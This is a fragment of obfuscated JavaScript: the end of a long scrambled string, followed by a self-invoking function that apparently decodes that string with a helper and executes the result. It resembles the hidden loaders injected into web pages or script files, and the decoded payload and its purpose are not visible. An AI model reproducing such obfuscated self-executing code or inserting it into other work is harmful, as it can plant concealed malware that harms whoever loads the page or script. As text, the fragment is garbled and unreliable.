}_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
